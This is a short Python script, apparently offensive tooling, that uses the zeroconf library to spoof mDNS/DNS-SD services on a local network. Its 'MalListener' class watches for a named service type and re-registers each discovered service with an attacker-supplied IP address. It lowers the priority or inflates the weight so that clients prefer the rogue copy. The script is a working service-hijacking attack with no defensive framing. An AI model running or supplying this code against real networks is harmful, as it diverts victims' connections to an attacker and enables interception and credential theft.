from zeroconf import ServiceBrowser, Zeroconf, IPVersion, ServiceInfo
import sys
import socket
#Basic listener concepts stolen from Rob Guderian's Zeroconf service discoverer example.


class MalListener:
    def __init__(self):
        self.infos = []
        self.ip = "127.0.0.1"
        self.names = []
    def remove_service(self, zeroconf, type, name):
        print("Service %s removed" % (name,))
    def add_service(self, zeroconf, type, name):
        info = zeroconf.get_service_info(type, name)
        print("Copying: %s" % (info,))
        if not name in self.names:
            print("Copying: %s" % (info,))
            if info.priority > 0:
                info.priority = 0
            else:
                info.weight = (info.weight + 1) * 10
            info.addresses = [self.ip]
            self.names.append(name)
            zc.register_service(info)
        
    def update_service(self, zeroconf, type, name):
        info = zeroconf.get_service_info(type, name)
        if not name in self.names:
            print("Copying: %s" % (info,))
            if info.priority > 0:
                info.priority = 0
            else:
                info.weight = (info.weight + 1) * 10
            info.addresses = [self.ip]
            self.names.append(name)
            zc.register_service(info)

zc = Zeroconf(ip_version=IPVersion.V4Only)
ml = MalListener()
ml.ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
ml.ip = socket.inet_aton(sys.argv[2])
zone = sys.argv[1]
browser = ServiceBrowser(zc, zone, ml)

try:
    input("Press enter to exit...\n\n")
finally:
    zc.unregister_all_services()
    zc.close()
